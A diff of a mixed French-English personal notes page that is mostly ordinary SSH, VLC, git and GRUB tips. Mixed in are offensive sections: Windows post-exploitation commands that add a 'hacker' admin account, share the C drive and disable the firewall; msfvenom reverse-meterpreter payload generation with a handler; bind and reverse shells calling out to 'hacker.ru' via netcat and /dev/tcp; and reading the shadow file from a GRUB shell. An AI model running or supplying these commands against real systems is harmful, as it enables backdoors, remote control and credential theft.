-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Creats a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net localgroup administrators /add hacker</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">or</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net localgroup administrators hacker /add</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Adds the new user ‘hacker’ to the local administrators group</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net share nothing$=C: /grant:hacker,FULL /unlimited</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Shares the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"></span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net user username /active:yes /domain</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched.</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netsh firewall set opmode disable</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Disables the local windows firewall</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netsh firewall set opmode enable</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;"></span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Enables the local windows firewall. If rules are not in place for your connection, this could cause you to loose it.</span>
-</td></tr>
-</tbody></table>
-
-
-<h1 id="tests"><a href="#TOC">TESTS</a></h1>
-<h2 id="toto"><a href="#TOC">TOTO</a></h2>
-<p>Here’s what a delimited code block looks like:</p>
-<pre><code>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ {.haskell}
--- | Inefficient quicksort in haskell.
-qsort :: (Enum a) =&gt; [a] -&gt; [a]
-qsort []     = []
-qsort (x:xs) = qsort (filter (&lt; x) xs) ++ [x] ++
-               qsort (filter (&gt;= x) xs) 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code></pre>
-<p>And here’s how it looks after syntax highlighting:</p>
-<pre class="sourceCode haskell"><code class="sourceCode haskell"><span class="co">-- | Inefficient quicksort in haskell.</span>
-<span class="ot">qsort ::</span> (<span class="kw">Enum</span> a) <span class="ot">=&gt;</span> [a] <span class="ot">-&gt;</span> [a]
-qsort []     <span class="fu">=</span> []
-qsort (x<span class="fu">:</span>xs) <span class="fu">=</span> qsort (<span class="fu">filter</span> (<span class="fu">&lt;</span> x) xs) <span class="fu">++</span> [x] <span class="fu">++</span>
-               qsort (<span class="fu">filter</span> (<span class="fu">&gt;=</span> x) xs) </code></pre>
-<p>Here’s some python, with numbered lines (specify <code>{.c .numberLines}</code>):</p>
-<table class="sourceCode c numberLines"><tr class="sourceCode"><td class="lineNumbers"><pre>1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-</pre></td><td class="sourceCode"><pre><code class="sourceCode c"><span class="co">//This is a Finite State Machine (FSM).</span>
-<span class="co">/* </span>
-<span class="co">**toto</span>
-<span class="co">*/</span>
-
-<span class="dt">int</span> main (<span class="dt">int</span> argc, <span class="dt">char</span>* argv[])
-{
-printf(<span class="st">&quot;toto&quot;</span>);
-
-<span class="kw">return</span> <span class="dv">0</span>;
-}</code></pre></td></tr></table>
-<p>toto</p>
-<pre class="sourceCode haskell"><code class="sourceCode haskell">qsort [] <span class="fu">=</span> []</code></pre>
-<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="dt">int</span> main (<span class="dt">int</span> argc, <span class="dt">char</span>* argv[])
-{
-printf(<span class="st">&quot;toto&quot;</span>);
-
-<span class="kw">return</span> <span class="dv">0</span>;
-}</code></pre>
-<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">echo</span> <span class="st">&quot;toto&quot;</span> <span class="kw">|grep</span> toto</code></pre>
-<h1 id="metasploit-1"><a href="#TOC">Metasploit</a></h1>
-<h2 id="genration-de-payload-executables"><a href="#TOC">Genration de payload executables</a></h2>
-<h3 id="manuel"><a href="#TOC">Manuel</a></h3>
+<h1 id="tools"><a href="#tools">Tools</a></h1>
+<h2 id="metasploit-1"><a href="#metasploit-1">Metasploit</a></h2>
+<h3 id="generation-de-payload-executables"><a href="#generation-de-payload-executables">Generation de payload executables</a></h3>
+<h4 id="manuel"><a href="#manuel">Manuel</a></h4>
 <pre><code># msfvenom -h
 Usage: /opt/framework/msf3/msfvenom [options] 
 
@@ -1070,14 +795,14 @@ Options:
     -x, --template   [path]          Specify a custom executable file to use as a template
     -k, --keep                       Preserve the template behavior and inject the payload as a new thread
     -h, --help                       Show this message</code></pre>
-<h3 id="exemple"><a href="#TOC">Exemple</a></h3>
-<h4 id="lister-les-options-dun-payload"><a href="#TOC">Lister les options d’un payload</a></h4>
+<h4 id="exemple"><a href="#exemple">Exemple</a></h4>
+<p>Lister les options d’un payload</p>
 <pre><code># msfvenom -p windows/meterpreter/reverse_tcp -o</code></pre>
-<h4 id="créer-un-payload-meterpreter-pour-windows"><a href="#TOC">Créer un payload meterpreter pour windows</a></h4>
+<p>Creer un payload meterpreter pour windows</p>
 <pre><code># msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 &gt; windobReverseMeterpreter5555.exe</code></pre>
-<h3 id="alternative"><a href="#TOC">Alternative</a></h3>
+<h4 id="alternative"><a href="#alternative">Alternative</a></h4>
 <pre><code># msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X &gt; met-reverse.exe</code></pre>
-<h2 id="lancement-de-handler"><a href="#TOC">Lancement de handler</a></h2>
+<h3 id="lancement-de-handler"><a href="#lancement-de-handler">Lancement de handler</a></h3>
 <pre><code># msfcli multi/handler LPORT=5555 E
 
 
@@ -1095,34 +820,43 @@ set PAYLOAD windows/meterpreter/bind_tcp
 set RHOST 192.168.0.1
 set LPORT 8888
 exploit</code></pre>
-<p>https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools</p>
-<h1 id="ssh"><a href="#TOC">SSH</a></h1>
-<h2 id="copy-ssh-keys-to-userhost-to-enable-password-less-ssh-logins"><a href="#TOC">copy ssh keys to user@host to enable password-less ssh logins</a></h2>
+<p>[MrTchuss] (https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools)</p>
+<p>﻿## SSH ## copy ssh keys to user@host to enable password-less ssh logins</p>
 <pre><code>ssh-copy-id user@host</code></pre>
-<h2 id="start-a-tunnel-from-some-machines-port-80-to-your-local-post-2001"><a href="#TOC">start a tunnel from some machine’s port 80 to your local post 2001</a></h2>
+<hr />
+<p>start a tunnel from some machine’s port 80 to your local post 2001</p>
 <pre><code>ssh -N -L2001:localhost:80 somemachine</code></pre>
-<h2 id="output-your-microphone-to-a-remote-computers-speaker"><a href="#TOC">output your microphone to a remote computer’s speaker</a></h2>
+<hr />
+<p>output your microphone to a remote computer’s speaker</p>
 <pre><code>dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp</code></pre>
-<h2 id="compare-a-remote-file-with-a-local-file"><a href="#TOC">compare a remote file with a local file</a></h2>
+<hr />
+<p>compare a remote file with a local file</p>
 <pre><code>ssh user@host cat /path/to/remotefile | diff /path/to/localfile -</code></pre>
-<h2 id="mount-folderfilesystem-through-ssh"><a href="#TOC">mount folder/filesystem through ssh</a></h2>
+<hr />
+<p>mount folder/filesystem through ssh</p>
 <pre><code>sshfs name@server:/path/to/folder /path/to/mount/point</code></pre>
-<h2 id="ssh-connection-through-host-in-the-middle"><a href="#TOC">ssh connection through host in the middle</a></h2>
+<hr />
+<p>ssh connection through host in the middle</p>
 <pre><code>ssh -t reachable_host ssh unreachable_host</code></pre>
-<h2 id="copy-from-host1-to-host2-through-your-host"><a href="#TOC">copy from host1 to host2, through your host</a></h2>
+<hr />
+<p>copy from host1 to host2, through your host</p>
 <pre><code>ssh root@host1 “cd /somedir/tocopy/ &amp;&amp; tar -cf – .” | ssh root@host2 “cd /samedir/tocopyto/ &amp;&amp; tar -xf -”</code></pre>
-<h2 id="run-any-gui-program-remotely"><a href="#TOC">run any gui program remotely</a></h2>
+<hr />
+<p>run any gui program remotely</p>
 <pre><code>ssh -fX &lt;user&gt;@&lt;host&gt; &lt;program&gt;
 The SSH server configuration requires: X11Forwarding yes</code></pre>
-<h2 id="create-a-persistent-connection-to-a-machine"><a href="#TOC">create a persistent connection to a machine</a></h2>
+<hr />
+<p>create a persistent connection to a machine</p>
 <pre><code>ssh -MNf &lt;user&gt;@&lt;host&gt;
 Create a persistent SSH connection to the host in the background. Combine this with settings in your ~/.ssh/config:
 Host host
 ControlPath ~/.ssh/master-%r@%h:%p
 ControlMaster no</code></pre>
-<h2 id="attach-screen-over-ssh"><a href="#TOC">attach screen over ssh</a></h2>
+<hr />
+<p>attach screen over ssh</p>
 <pre><code>ssh -t remote_host screen -r</code></pre>
-<h2 id="port-knocking"><a href="#TOC">port knocking!</a></h2>
+<hr />
+<p>port knocking</p>
 <pre><code>knock &lt;host&gt; 3000 4000 5000 &amp;&amp; ssh -p &lt;port&gt; user@host &amp;&amp; knock &lt;host&gt; 5000 4000 3000</code></pre>
 <p>Knock on ports to open a port to a service (ssh for example) and knock again to close the port. You have to install knockd. See example config file below.</p>
 <pre><code>[options]
@@ -1137,61 +871,76 @@ sequence = 5000,4000,3000
 seq_timeout = 5
 command = /sbin/iptables -D INPUT -i eth0 -s %IP% -p tcp –dport 22 -j ACCEPT
 tcpflags = syn</code></pre>
-<h2 id="remove-a-line-in-a-text-file.-useful-to-fix"><a href="#TOC">remove a line in a text file. useful to fix</a></h2>
+<hr />
+<p>remove a line in a text file. useful to fix</p>
 <pre><code>ssh-keygen -R &lt;the_offending_host&gt;</code></pre>
-<h2 id="run-complex-remote-shell-cmds-over-ssh-without-escaping-quotes"><a href="#TOC">run complex remote shell cmds over ssh, without escaping quotes</a></h2>
+<hr />
+<p>run complex remote shell cmds over ssh, without escaping quotes</p>
 <pre><code>ssh host -l user $(&lt;cmd.txt)</code></pre>
-<h2 id="copy-a-mysql-database-to-a-new-server-via-ssh-with-one-command"><a href="#TOC">copy a mysql database to a new server via ssh with one command</a></h2>
+<hr />
+<p>copy a mysql database to a new server via ssh with one command</p>
 <pre><code>mysqldump –add-drop-table –extended-insert –force –log-error=error.log -uUSER -pPASS OLD_DB_NAME | ssh -C user@newhost “mysql -uUSER -pPASS NEW_DB_NAME”</code></pre>
-<h2 id="remove-a-line-in-a-text-file.-useful-to-fix-ssh-host-key-change-warnings"><a href="#TOC">remove a line in a text file. useful to fix “ssh host key change” warnings</a></h2>
+<hr />
+<p>remove a line in a text file. useful to fix “ssh host key change” warnings</p>
 <pre><code>sed -i 8d ~/.ssh/known_hosts</code></pre>
-<h2 id="copy-your-ssh-public-key-to-a-server-from-a-machine-that-doesnt-have-ssh-copy-id"><a href="#TOC">copy your ssh public key to a server from a machine that doesn’t have ssh-copy-id</a></h2>
+<hr />
+<p>copy your ssh public key to a server from a machine that doesn’t have ssh-copy-id</p>
 <pre><code>cat ~/.ssh/id_rsa.pub | ssh user@machine “mkdir ~/.ssh; cat &gt;&gt; ~/.ssh/authorized_keys”</code></pre>
-<h2 id="live-ssh-network-throughput-test"><a href="#TOC">live ssh network throughput test</a></h2>
+<hr />
+<p>live ssh network throughput test</p>
 <pre><code>yes | pv | ssh $host “cat &gt; /dev/null”</code></pre>
-<h2 id="how-to-establish-a-remote-gnu-screen-session-that-you-can-re-connect-to"><a href="#TOC">how to establish a remote gnu screen session that you can re-connect to</a></h2>
+<hr />
+<p>how to establish a remote gnu screen session that you can re-connect to</p>
 <pre><code>ssh -t user@some.domain.com /usr/bin/screen -xRR</code></pre>
-<h2 id="resume-scp-of-a-big-file"><a href="#TOC">resume scp of a big file</a></h2>
+<hr />
+<p>resume scp of a big file</p>
 <pre><code>rsync –partial –progress –rsh=ssh $file_source $user@$host:$destination_file
 It requires rsync installed in both hosts.
 rsync –partial –progress –rsh=ssh $file_source $user@$host:$destination_file local -&gt; remote</code></pre>
 <p>or</p>
 <pre><code>rsync –partial –progress –rsh=ssh $user@$host:$remote_file $destination_file remote -&gt; local</code></pre>
-<h2 id="analyze-traffic-remotely-over-ssh-w-wireshark"><a href="#TOC">analyze traffic remotely over ssh w/ wireshark</a></h2>
+<hr />
+<p>analyze traffic remotely over ssh w/ wireshark</p>
 <pre><code>ssh root@server.com ‘tshark -f “port !22? -w -’ | wireshark -k -i -
 ssh root@example.com tcpdump -w – ‘port !22&#39; | wireshark -k -i -</code></pre>
-<h2 id="have-an-ssh-session-open-forever"><a href="#TOC">have an ssh session open forever</a></h2>
+<hr />
+<p>have an ssh session open forever</p>
 <pre><code>autossh -M50000 -t server.example.com ‘screen -raAd mysession’</code></pre>
-<h2 id="harder-faster-stronger-ssh-clients"><a href="#TOC">harder, faster, stronger ssh clients</a></h2>
+<hr />
+<p>harder, faster, stronger ssh clients</p>
 <pre><code>ssh -4 -C -c blowfish-cbc</code></pre>
-<h2 id="throttle-bandwidth-with-cstream"><a href="#TOC">throttle bandwidth with cstream</a></h2>
+<hr />
+<p>throttle bandwidth with cstream</p>
 <pre><code>tar -cj /backup | cstream -t 777k | ssh host ‘tar -xj -C /backup’
-example: echo w00t, i’m 733+ | cstream -b1 -t2</code></pre>
-<h2 id="transfer-ssh-public-key-to-another-machine-in-one-step"><a href="#TOC">transfer ssh public key to another machine in one step</a></h2>
+example: echo w00t, i&#39;m 733+ | cstream -b1 -t2</code></pre>
+<hr />
+<p>transfer ssh public key to another machine in one step</p>
 <pre><code>ssh-keygen; ssh-copy-id user@host; ssh user@host</code></pre>
-<h2 id="copy-stdin-to-your-x11-buffer"><a href="#TOC">copy stdin to your x11 buffer</a></h2>
+<hr />
+<p>copy stdin to your x11 buffer</p>
 <pre><code>ssh user@host cat /path/to/some/file | xclip</code></pre>
-<h2 id="create-an-encrypted-tunnel-over-ssh-for-your-synergy-client-to-use"><a href="#TOC">Create an encrypted tunnel over ssh for your synergy client to use</a></h2>
+<hr />
+<p>Create an encrypted tunnel over ssh for your synergy client to use</p>
 <pre><code>ssh -f -N -L 24800:localhost:24800 synergyserver 
 see : http://synergy-foss.org</code></pre>
-<h1 id="vlc"><a href="#TOC">VLC</a></h1>
-<h2 id="transcoding"><a href="#TOC">Transcoding</a></h2>
-<h3 id="vers-mp4"><a href="#TOC">vers MP4</a></h3>
+<h2 id="vlc"><a href="#vlc">VLC</a></h2>
+<h3 id="transcoding"><a href="#transcoding">Transcoding</a></h3>
+<h4 id="vers-mp4"><a href="#vers-mp4">Vers MP4</a></h4>
 <pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mpga,ab=192,scale=1,channels=2}:standard{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; 
 &quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mp4a}:std{access=file,mux=mp4,dst=&#39;output.mp4&#39;}&quot; </code></pre>
-<h3 id="vers-avi"><a href="#TOC">vers AVI</a></h3>
+<h4 id="vers-avi"><a href="#vers-avi">vers AVI</a></h4>
 <pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp:sout=&quot;#transcode{vcodec=div3,vb=4000,fps=25,acodec=mp3,ab=192,channels=2,samplerate=48000,audio-sync,deinterlace,scale=1}:std{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; </code></pre>
-<h2 id="options-utiles"><a href="#TOC">Options utiles</a></h2>
-<pre><code>--audio, --no-audio Activer l&#39;audio (activé par défaut)
---start-time &lt;second&gt; Démarre la vidéo à un temps donné
---stop-time &lt;second&gt; Arrêtes la vidéo à un temps donné
+<h3 id="options-utiles"><a href="#options-utiles">Options utiles</a></h3>
+<pre><code>--audio, --no-audio Activer l&#39;audio (active par defaut)
+--start-time &lt;second&gt; Demarre la video a un temps donne
+--stop-time &lt;second&gt; Arretes la video a un temps donne
 -I dummy N&#39;ouvre pas l&#39;interface graphique
 vlc://quit A mettre en fin de ligne pour fermer vlc</code></pre>
-<h2 id="net-casting-http"><a href="#TOC">Net casting http</a></h2>
+<h3 id="net-casting-http"><a href="#net-casting-http">Net casting http</a></h3>
 <pre><code>vlc -I dummy v4l2:///dev/video0 --no-audio --sout &#39;#transcode{vcodec=mp4v,acodec=mpga,vb=900,ab=128}:std{access=http,mux=ogg,dst=192.168.0.227:8080}&#39;
 
 vlc http://ip:port</code></pre>
-<h2 id="devices"><a href="#TOC">Devices</a></h2>
+<h3 id="devices"><a href="#devices">Devices</a></h3>
 <pre><code>Stream MRL syntax:
   [[access][/demux]://]URL[#[title][:chapter][-[title][:chapter]]]
   [:option=value ...]
@@ -1215,6 +964,505 @@ URL syntax:
 
 v4l2:///dev/video0
 cdrom://</code></pre>
+<h1 id="internet"><a href="#internet">Internet</a></h1>
+<h2 id="cheatsheet"><a href="#cheatsheet">CheatSheet</a></h2>
+<p><a href="../ressources/CheatSheet/">local path : 2014-02-06</a></p>
+<h3 id="sqli"><a href="#sqli">SQLi</a></h3>
+<p><a href="http://www.websec.ca/kb/sql_injection">The SQL Injection Knowledge Base</a></p>
+<p><a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/">SQL Injection Cheat Sheet</a></p>
+<p><a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access SQL Injection Cheat Sheet</a></p>
+<p><a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet">SQLite3 Injection Cheat Sheet</a></p>
+<p><a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/">sqli-filter-evasion-cheat-sheet-mysql</a></p>
+<p><a href="http://bobby-tables.com/">A guide to preventing SQL injection</a></p>
+<h3 id="html"><a href="#html">HTML</a></h3>
+<p><a href="http://html5sec.org/">HTML5 Security Cheatsheet</a></p>
+<h3 id="multiples-categories"><a href="#multiples-categories">Multiples categories</a></h3>
+<p>Shell, SQLi, Tools</p>
+<p><a href="http://pentestmonkey.net/cheat-sheet">Pentestmonkey</a></p>
+<p><a href="http://averagesecurityguy.info/cheat-sheet/">averagesecurityguy</a></p>
+<p><a href="https://www.owasp.org/index.php/Virtual_Patching_Cheat_Sheet">Virtual Patching Cheat Sheet</a></p>
+<p><a href="http://www.tug.org/texshowcase/cheat.pdf">Theoretical Computer Science Cheat Sheet</a></p>
+<h1 id="linux-1"><a href="#linux-1">Linux</a></h1>
+<h2 id="linux-tricks"><a href="#linux-tricks">Linux tricks</a></h2>
+<h3 id="affichage-de-ladresse-ip"><a href="#affichage-de-ladresse-ip">Affichage de l’adresse IP</a></h3>
+<h4 id="utilisation"><a href="#utilisation">Utilisation</a></h4>
+<pre><code>ifdata -pa eth0</code></pre>
+<h4 id="instalation"><a href="#instalation">Instalation</a></h4>
+<pre><code>apt-get install moreutils</code></pre>
+<h3 id="bash-tricks"><a href="#bash-tricks">Bash tricks</a></h3>
+<p>The following tricks use the bash history.</p>
+<pre><code>$ echo toto
+toto
+
+$ echo !$
+echo toto
+toto</code></pre>
+<pre><code>$ echo toto titi
+toto titi
+
+$ echo !-1:1
+echo toto
+toto</code></pre>
+<pre><code>$ echo tata toto titi
+tata toto titi
+
+$ echo toto titi
+toto titi
+
+$ echo !-2:2
+echo toto
+toto</code></pre>
+<pre><code>$ echo tata toto titi
+tata toto titi
+
+$ echo toto titi
+toto titi
+
+$ echo !-2:1
+echo tata
+tata</code></pre>
+<h2 id="commandes-linux-post-exploitation"><a href="#commandes-linux-post-exploitation">Commandes Linux post exploitation</a></h2>
+<h3 id="création-dun-bindshell"><a href="#création-dun-bindshell">Création d’un bindshell</a></h3>
+<pre><code>nc -e /bin/bash -lp 8080</code></pre>
+<p>Si la première version ne fonctionne pas :</p>
+<pre><code>nc -e /bin/bash -l 8080</code></pre>
+<h3 id="création-dun-reverse-bindshell"><a href="#création-dun-reverse-bindshell">Création d’un reverse bindshell</a></h3>
+<pre><code>/bin/bash &lt; /dev/tcp/hacker.ru/80 1&gt;&amp;0</code></pre>
+<p>Si netcat est présent :</p>
+<pre><code>nc -e /bin/bash hacker.ru 80</code></pre>
+<h1 id="tools-1"><a href="#tools-1">Tools</a></h1>
+<h2 id="git"><a href="#git">GIT</a></h2>
+<h3 id="ressources"><a href="#ressources">Ressources</a></h3>
+<h4 id="fichier-de-configuration-.gitconfig"><a href="#fichier-de-configuration-.gitconfig">Fichier de configuration .gitconfig</a></h4>
+<p>Ce fichier permet de paramétrer git, notamment pour préciser les variables d’environnement et les alias de commandes. Voir <a href="../ressources/Tools/GIT/.gitconfig">l’exemple</a>.</p>
+<h4 id="fichier-de-configuration-.gitignore"><a href="#fichier-de-configuration-.gitignore">Fichier de configuration .gitignore</a></h4>
+<p>Ce fichier permet de préciser les fichiers qui doivent être ignorés par Git. Pour ce faire, il doit être mentionné dans le .gitconfig comme suit :</p>
+<pre><code>[core]
+    excludesfile = /home/&lt;username&gt;/.gitignore</code></pre>
+<p>Voici un exemple de fichier :</p>
+<pre><code>_build*
+_inst*
+*.o
+*~
+Thumbs.db</code></pre>
+<h4 id="script-dajout-didentité"><a href="#script-dajout-didentité">Script d’ajout d’identité</a></h4>
+<p>Ce script a pour but de ne plus avoir à saisir le mot de passe de sa clé privé à chaque connexion. /!\ L’utilisation de ce script nuit à votre sécurité.</p>
+<p>Voici le fichier :</p>
+<pre><code>var=`ssh-agent -s`
+eval &quot;$var&quot;
+ssh-add ~/.ssh/id_dsa ~/.ssh/id_rsa
+unset var</code></pre>
+<p>Pour l’utiliser, il faut le sourcer comme suit ou l’intégrer à votre .bashrc :</p>
+<pre><code>. ~/.ssh-add-identity</code></pre>
+<h3 id="useful-commands"><a href="#useful-commands">Useful commands</a></h3>
+<h4 id="change-log-information"><a href="#change-log-information">Change log information</a></h4>
+<pre><code>git filter-branch -f --env-filter &quot;GIT_AUTHOR_NAME=&#39;Newname&#39;; GIT_AUTHOR_EMAIL=&#39;newemail&#39;; GIT_COMMITTER_NAME=&#39;Newname&#39;; GIT_COMMITTER_EMAIL=&#39;newemail&#39;;&quot; HEAD</code></pre>
+<h4 id="récupérer-les-modifications-présentes-sur-le-serveur"><a href="#récupérer-les-modifications-présentes-sur-le-serveur">Récupérer les modifications présentes sur le serveur</a></h4>
+<pre><code>git fetch
+git rebase origin/&lt;Nom de la branche par rapport à qui se mettre à jour&gt;
+#exemple :
+git rebase origin/master</code></pre>
+<h4 id="mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant"><a href="#mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant">Mettre à jour le dépôt local par rapport au dépôt distant</a></h4>
+<pre><code>git fra</code></pre>
+<h4 id="faire-un-commit-local"><a href="#faire-un-commit-local">Faire un commit local</a></h4>
+<pre><code>git status  # voir le status des fichiers
+git add &lt;Nouveaux fichiers&gt;
+git commit -m &#39;&lt;Message de commit&gt;&#39;</code></pre>
+<h4 id="pousser-les-modifications-sur-le-serveur"><a href="#pousser-les-modifications-sur-le-serveur">Pousser les modifications sur le serveur</a></h4>
+<pre><code>git push</code></pre>
+<h4 id="créer-une-branche-sur-un-serveur-remote"><a href="#créer-une-branche-sur-un-serveur-remote">Créer une branche sur un serveur (remote)</a></h4>
+<pre><code> git push origin master:refs/heads/testing
+ git cob testing          
+ echo chiche_branch &gt; test
+ git ci -a -m &#39;Chiche test&#39;
+ git push origin testing</code></pre>
+<p>ou bien</p>
+<p>will create the branch staging in the origin repository by copying the local master branch</p>
+<pre><code>git push origin master:refs/heads/testing</code></pre>
+<h4 id="merger-2-branches"><a href="#merger-2-branches">Merger 2 branches</a></h4>
+<pre><code>git br crazy_idea
+git br
+    experimental
+    crazy_idea
+  * master
+git co crazy_idea
+# merge experimental dans crazy_idea
+git merge experimental
+git commit -a</code></pre>
+<h4 id="supprimer-une-branche-locale"><a href="#supprimer-une-branche-locale">Supprimer une branche locale</a></h4>
+<p>Cette commande s’assure que les changement de la branche ‘experimental’ se trouve dans la branche courante.</p>
+<pre><code>git branch -d experimental</code></pre>
+<p>Si vous développez une idée folle, puis le regrettez, vous pouvez toujours effacer cette branche avec -D</p>
+<pre><code>git branch -D crazy_idea</code></pre>
+<h4 id="delete-a-remote-branch"><a href="#delete-a-remote-branch">Delete a Remote Branch</a></h4>
+<p>will delete the branch staging from the origin repository.</p>
+<pre><code>git push origin :testing</code></pre>
+<h2 id="grub"><a href="#grub">GRUB</a></h2>
+<h3 id="configuration---modification-de-la-taille-du-terminal"><a href="#configuration---modification-de-la-taille-du-terminal">Configuration - Modification de la taille du terminal</a></h3>
+<p>Pour Grub2, il suffit de : * Surcharger la valeur de GRUB_GFXMODE dans /etc/default/grub ; * Surcharger la valeur de GRUB_GFXPAYLOAD_LINUX dans /etc/default/grub ; * Mettre à jour grub ; * Redémarrer.</p>
+<p>Soit, en root :</p>
+<pre><code>echo GRUB_GFXMODE=1024x768      &gt;&gt; /etc/default/grub
+echo GRUB_GFXPAYLOAD_LINUX=keep &gt;&gt; /etc/default/grub
+update-grub
+reboot</code></pre>
+<h3 id="affichage-du-fichier-shadow"><a href="#affichage-du-fichier-shadow">Affichage du fichier shadow</a></h3>
+<p>Il faut tout d’abord accéder au shell de GRUB. Pour ce faire, il suffit de presser la touche <strong>c</strong> quand le menu de sélection de grub s’affiche :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-menu.png" title="Grub menu" alt="Menu" /><p class="caption">Menu</p>
+</div>
+<p>Ensuite, il faut trouver le fichier shadow. Pour cela, il est possible d’utiliser la commande <strong>ls</strong> pour lister les devices disponibles :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-shell-ls.png" title="Grub command line : ls" alt="Ls" /><p class="caption">Ls</p>
+</div>
+<p>Pour faire plus simple, il est possible d’utiliser la commande <strong>search</strong> :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-shell-search.png" title="Grub command line : search" alt="Search" /><p class="caption">Search</p>
+</div>
+<p>Une fois le fichier trouvé, il ne reste plus qu’à afficher le fichier avec la commande <strong>cat</strong> :</p>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-shell-cat1.png" title="Grub command line : cat" />
+</div>
+<div class="figure">
+<img src="../ressources/Tools/GRUB/grub-shell-cat2.png" title="Grub command line : cat" />
+</div>
+<h3 id="récupération-dun-shell-root"><a href="#récupération-dun-shell-root">Récupération d’un shell root</a></h3>
